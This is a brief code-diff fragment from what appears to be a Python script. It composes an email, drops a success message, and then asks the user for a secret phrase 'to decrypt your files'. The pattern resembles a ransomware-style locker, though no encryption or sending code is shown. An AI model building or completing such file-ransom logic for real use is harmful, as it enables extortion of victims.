@@ -43,8 +43,6 @@ message["To"] = receiver_email
 message["Subject"] = subject
 message.attach(MIMEText(body, "plain"))
 
-print("Email sent successfully!")
-
 user_phrase = input("Enter the secret phrase to decrypt your files\n")
 
 if user_phrase == secretphrase:
